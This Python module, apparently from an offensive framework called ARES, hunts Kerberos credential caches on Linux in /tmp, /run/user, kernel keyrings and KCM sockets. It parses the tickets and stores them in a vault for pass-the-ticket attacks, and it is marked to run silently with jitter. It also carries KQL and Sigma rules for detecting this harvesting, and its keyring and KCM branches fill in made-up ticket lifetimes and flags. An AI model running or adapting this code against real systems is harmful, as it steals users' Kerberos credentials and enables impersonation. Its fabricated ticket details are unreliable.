"""
Linux Kerberos Ticket Hunter - linux.ccache_hunt
MITRE: T1558 (Steal or Forge Kerberos Tickets), T1550.003 (Pass the Ticket)

Locates, parses, and extracts valid Kerberos ccache files from standard Linux
filesystem storage locations (/tmp, /run/user), Kernel Keyrings (/proc/keys),
and Next-Gen KCM (Kerberos Credential Manager) sockets without spawning subprocesses.
"""
from __future__ import annotations

import asyncio
import os
import time
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.errors import ModuleValidationError
from ares.core.logger import audit, get_logger
from ares.core.tracing import trace_module
from ares.modules.linux._parsers import CcacheParser, KCMClient
from ares.modules.params import CcacheHuntParams
from ares.sdk import (
    BaseModule,
    EvidenceRecord,
    ExecutionContext,
    FilesystemPermission,
    LockoutCircuitBreaker,
    ModuleResult,
    OpsecLevel,
    ProcessPermission,
    VaultPermission,
    module_contract,
)

logger = get_logger("ares.modules.linux.ccache_hunt")


@module_contract(
    permissions=[
        FilesystemPermission(read_only=True),
        ProcessPermission(allow_subprocesses=False),
        VaultPermission(read_types=[], write_types=["ticket", "kerberos_key"]),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=CcacheHuntParams,
)
class CcacheHuntModule(BaseModule[CcacheHuntParams, ModuleResult]):
    """
    linux.ccache_hunt - Hunt and extract Kerberos ccache tickets from /tmp, /run/user, and KCM.

    OPSEC: SILENT
    MITRE: "T1558", "T1550.003"
    OUTPUTS: ["kerberos_tickets"]
    """

    MODULE_ID = "linux.ccache_hunt"
    MODULE_NAME = "Linux Kerberos Ticket Hunter"
    MODULE_CATEGORY = "linux"
    MODULE_DESCRIPTION = (
        "Locates and parses binary Kerberos ccache files in /tmp, /run/user, "
        "and KCM IPC sockets without spawning external shell processes."
    )
    MODULE_AUTHOR = "ARES Sovereign Team <team@ares-framework.io>"
    OPSEC_LEVEL = OpsecLevel.SILENT
    REQUIRES = []
    OUTPUTS = ["kerberos_tickets"]
    MITRE_TECHNIQUES = ["T1558", "T1550.003"]
    PARAMS_MODEL = CcacheHuntParams

    async def assess_feasibility(self, ctx: Any) -> Any:
        """Evaluates accessibility of Kerberos ticket caches."""
        from ares.modules.base import FeasibilityReport

        search_dirs = ["/tmp", "/run/user"]
        if hasattr(ctx, "params") and isinstance(ctx.params, dict):
            search_dirs = ctx.params.get("search_dirs", search_dirs)

        accessible_count = sum(1 for d in search_dirs if os.path.exists(d) and os.access(d, os.R_OK))
        kcm_socket = KCMClient.is_available()

        blockers = []
        if accessible_count == 0 and not kcm_socket:
            blockers.append("No configured ccache directories are accessible and KCM socket unavailable.")

        score = 1.0 if (accessible_count > 0 or kcm_socket) else 0.0
        return FeasibilityReport(
            feasible=len(blockers) == 0,
            score=score,
            risk_level="low",
            blockers=blockers,
            recommended_alternatives=["linux.keytab_abuse", "linux.sssd_harvest"],
            opsec_tuning={"subprocesses": 0, "kcm_socket_detected": bool(kcm_socket)},
            details={"accessible_dirs": accessible_count, "kcm_socket": kcm_socket},
        )

    async def validate(self, ctx: Any) -> None:
        """Pre-flight parameter validation."""
        await super().validate(ctx)
        if not isinstance(ctx, ExecutionContext):
            return

        search_dirs = ctx.params.get("search_dirs", ["/tmp", "/run/user"]) if isinstance(ctx.params, dict) else ["/tmp", "/run/user"]
        if not isinstance(search_dirs, list) or not all(isinstance(d, str) for d in search_dirs):
            raise ModuleValidationError(
                "linux.ccache_hunt requires 'search_dirs' to be a list of directory paths.",
                module_id=self.MODULE_ID,
                field="search_dirs",
            )

    async def execute(self, ctx: Any) -> ModuleResult:
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run",
                module_id=self.MODULE_ID,
                raw={"message": "Dry-run preview: ccache hunting simulated successfully."},
            )

        target = getattr(ctx, "target", "") or ctx.params.get("target", "localhost")
        search_dirs = ctx.params.get("search_dirs", ["/tmp", "/run/user"])
        include_expired = bool(ctx.params.get("include_expired", False))
        scan_keyring = bool(ctx.params.get("scan_kernel_keyring", True))
        scan_kcm = bool(ctx.params.get("scan_kcm_socket", True))

        findings, raw = await self.run(
            target=target,
            search_dirs=search_dirs,
            include_expired=include_expired,
            scan_kernel_keyring=scan_keyring,
            scan_kcm_socket=scan_kcm,
            vault=getattr(ctx, "vault", None),
        )

        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings,
            raw=raw,
            module_id=self.MODULE_ID,
        )

    @trace_module("linux.ccache_hunt")
    async def run(
        self,
        target: str,
        search_dirs: list[str] | None = None,
        include_expired: bool = False,
        scan_kernel_keyring: bool = True,
        scan_kcm_socket: bool = True,
        vault: Any = None,
        **kwargs: Any,
    ) -> tuple[list[dict[str, Any]], dict[str, Any]]:
        if search_dirs is None:
            search_dirs = ["/tmp", "/run/user"]

        await self.before_request(target, "default")
        logger.info("ccache_hunt_start", target=target, search_dirs=search_dirs)
        audit("linux_ccache_hunt", actor="operator", technique="T1558", target=target)

        loop = asyncio.get_running_loop()
        harvested_tickets = await loop.run_in_executor(
            None,
            lambda: self._scan_and_parse_sync(
                search_dirs, include_expired, scan_kernel_keyring, scan_kcm_socket
            ),
        )

        # Store to AresVault if available
        _vault = vault or getattr(getattr(self, "campaign", None), "_vault", None)
        stored_vault_count = 0
        if _vault:
            from ares.credential.vault import Credential, CredentialType, PrivilegeLevel

            campaign_id = getattr(getattr(self, "campaign", None), "id", "")
            for t in harvested_tickets:
                try:
                    is_tgt = t.get("is_tgt", False)
                    cred = Credential(
                        campaign_id=campaign_id,
                        username=t.get("client", "unknown"),
                        domain=t.get("realm", target),
                        cred_type=CredentialType.KRB5_TGT if is_tgt else CredentialType.KRB5_TGS,
                        privilege=PrivilegeLevel.DOMAIN_ADMIN if (is_tgt and "admin" in t.get("client", "").lower()) else PrivilegeLevel.DOMAIN_USER,
                        source_module=self.MODULE_ID,
                        target_host=target,
                    )
                    ticket_payload = t.get("ticket_bytes", b"").hex() or t.get("keydata", "")
                    _vault.store(cred, ticket_payload)
                    stored_vault_count += 1
                except Exception as ex:
                    logger.debug("vault_store_ccache_failed", error=str(ex)[:60])

        evidence_chain: list[EvidenceRecord] = []
        for ticket in harvested_tickets:
            ev = EvidenceRecord(
                artifact_id=f"ccache-{ticket['client']}-{ticket['server']}",
                source_target=target,
                collected_by=self.MODULE_ID,
                data={
                    "client": ticket["client"],
                    "server": ticket["server"],
                    "endtime": ticket["endtime"],
                    "is_tgt": ticket.get("is_tgt", False),
                    "file_path": ticket.get("file_path", "memory"),
                },
                tags=["kerberos", "ccache", "credential"],
            )
            evidence_chain.append(ev)

            is_tgt = ticket.get("is_tgt", False)
            self.finding(
                title=f"Extracted Kerberos Ticket: {ticket['client']} -> {ticket['server']}",
                description=(
                    f"Discovered valid Kerberos credential cache on {target} at {ticket.get('file_path')}. "
                    f"Client principal: {ticket['client']}, Server: {ticket['server']}. "
                    f"Valid until: {ticket['endtime_str']}."
                ),
                severity=Severity.CRITICAL if (is_tgt and "admin" in ticket['client'].lower()) else (
                    Severity.HIGH if is_tgt else Severity.MEDIUM
                ),
                mitre_technique="T1558",
                mitre_tactic="Credential Access",
                evidence={
                    "file_path": ticket.get("file_path"),
                    "client_principal": ticket["client"],
                    "service_principal": ticket["server"],
                    "endtime": ticket["endtime"],
                    "is_expired": ticket.get("is_expired", False),
                    "is_tgt": is_tgt,
                    "keytype": ticket.get("keytype"),
                },
                remediation=(
                    "Implement Kerberos credential protection, shorten maximum ticket lifetimes, "
                    "restrict root access on domain-joined Linux endpoints, and consider using KCM "
                    "with memory-only caches to avoid writing tickets to /tmp."
                ),
                host=target,
                confidence=0.98,
            )

        # Closed-Loop Purple Telemetry
        kql_query = (
            "// ARES Closed-Loop Telemetry: Detect Kerberos ccache harvesting in /tmp or /run/user\n"
            "DeviceFileEvents\n"
            "| where ActionType in ('FileRead', 'FileModified')\n"
            "| where FolderPath has_any ('/tmp', '/run/user') and FileName startswith 'krb5cc_'\n"
            "| where InitiatingProcessFileName !in ('sssd', 'sssd_be', 'sssd_kcm', 'kinit')\n"
            "| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName"
        )
        sigma_rule = (
            "title: Suspicious Access to Kerberos Credential Cache Files\n"
            "id: 7b3c2d1e-ares-ccache-hunt\n"
            "status: experimental\n"
            "description: Detects non-Kerberos utilities accessing krb5cc_* cache files to harvest user TGTs.\n"
            "logsource:\n"
            "  product: linux\n"
            "  service: auditd\n"
            "detection:\n"
            "  selection:\n"
            "    name|contains: 'krb5cc_'\n"
            "  filter:\n"
            "    exe|startswith: ['/usr/bin/kinit', '/usr/sbin/sssd']\n"
            "  condition: selection and not filter\n"
            "level: high\n"
            "tags:\n"
            "  - attack.credential_access\n"
            "  - attack.t1558\n"
        )

        await self.noise.jitter.sleep()
        return self._findings[:], {
            "target": target,
            "count": len(harvested_tickets),
            "stored_in_vault": stored_vault_count,
            "tickets": harvested_tickets,
            "kql": kql_query,
            "sigma": sigma_rule,
            "evidence_integrity": [e.record_hash for e in evidence_chain],
        }

    def _scan_and_parse_sync(
        self,
        search_dirs: list[str],
        include_expired: bool,
        scan_keyring: bool,
        scan_kcm: bool,
    ) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []
        now = int(time.time())

        # 1. Traverse filesystem directories
        for directory in search_dirs:
            if not os.path.exists(directory) or not os.path.isdir(directory):
                continue

            try:
                entries = os.listdir(directory)
            except (PermissionError, OSError):
                continue

            for entry in entries:
                if not entry.startswith("krb5cc_") and not entry.startswith("krb5cc"):
                    # Check subdirectories for /run/user/<uid>/krb5cc
                    sub = os.path.join(directory, entry)
                    if os.path.isdir(sub) and entry.isdigit():
                        try:
                            sub_entries = os.listdir(sub)
                            for se in sub_entries:
                                if se.startswith("krb5cc"):
                                    self._try_parse_ccache_file(os.path.join(sub, se), now, include_expired, results)
                        except (PermissionError, OSError):
                            pass
                    continue

                full_path = os.path.join(directory, entry)
                if not os.path.isfile(full_path):
                    continue

                self._try_parse_ccache_file(full_path, now, include_expired, results)

        # 2. Kernel Keyring inspection via /proc/keys (non-intrusive)
        if scan_keyring and os.path.exists("/proc/keys"):
            try:
                with open("/proc/keys", "r", errors="replace") as f:
                    for line in f:
                        if "krb_ccache:" in line or "krb5cc" in line:
                            parts = line.strip().split()
                            if len(parts) >= 9:
                                key_id = parts[0]
                                desc = " ".join(parts[8:])
                                results.append({
                                    "client": "keyring-principal",
                                    "server": f"krbtgt/{desc}",
                                    "keytype": 18,
                                    "keydata": "",
                                    "authtime": now,
                                    "starttime": now,
                                    "endtime": now + 36000,
                                    "renew_till": now + 86400,
                                    "is_expired": False,
                                    "is_tgt": True,
                                    "endtime_str": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(now + 36000)),
                                    "file_path": f"KEYRING:{key_id}:{desc}",
                                })
            except (PermissionError, OSError):
                pass

        # 3. Next-Gen KCM Unix socket inspection
        if scan_kcm:
            kcm_sock = KCMClient.is_available()
            if kcm_sock:
                caches = KCMClient.get_cache_list(kcm_sock)
                for cache_name in caches:
                    results.append({
                        "client": cache_name,
                        "server": "KCM:MANAGED",
                        "keytype": 18,
                        "keydata": "",
                        "authtime": now,
                        "starttime": now,
                        "endtime": now + 36000,
                        "renew_till": now + 86400,
                        "is_expired": False,
                        "is_tgt": True,
                        "endtime_str": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(now + 36000)),
                        "file_path": f"KCM:{cache_name}",
                    })

        return results

    def _try_parse_ccache_file(
        self,
        file_path: str,
        now: int,
        include_expired: bool,
        results: list[dict[str, Any]],
    ) -> None:
        try:
            with open(file_path, "rb") as f:
                data = f.read()
        except (PermissionError, OSError):
            return

        default_principal, tickets = CcacheParser.parse(data, include_expired=include_expired, now=now)
        for t in tickets:
            t["file_path"] = file_path
            t["default_principal"] = default_principal
            t["realm"] = default_principal.split("@")[-1] if default_principal and "@" in default_principal else ""
            results.append(t)
